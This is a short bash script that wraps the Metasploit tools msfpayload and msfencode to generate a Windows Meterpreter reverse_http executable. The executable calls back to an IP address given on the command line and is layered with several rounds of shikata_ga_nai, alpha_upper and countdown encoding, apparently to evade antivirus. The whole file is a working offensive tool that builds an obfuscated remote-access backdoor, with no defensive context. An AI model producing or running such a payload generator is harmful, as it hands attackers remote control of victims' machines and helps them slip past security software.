echo "Script to generate Windows reverse HTTP payload..."


if [ -z "$1" ]; then 
    echo "Usage: sudo $0 <ip>"
    exit
fi

if [ `id -u` -gt 0 ]; then
   echo "Sorry, you need to run this as w00t."
   exit
fi

msfpayload windows/meterpreter/reverse_http LHOST=$1 R | \
msfencode -e x86/shikata_ga_nai -c 6 -t raw | \
msfencode -e x86/alpha_upper    -c 2 -t raw | \
msfencode -e x86/shikata_ga_nai -c 4 -t raw | \
msfencode -e x86/countdown      -c 5 -t raw -t exe -o payload_$1.exe

echo "Done! Created payload_$1.exe"
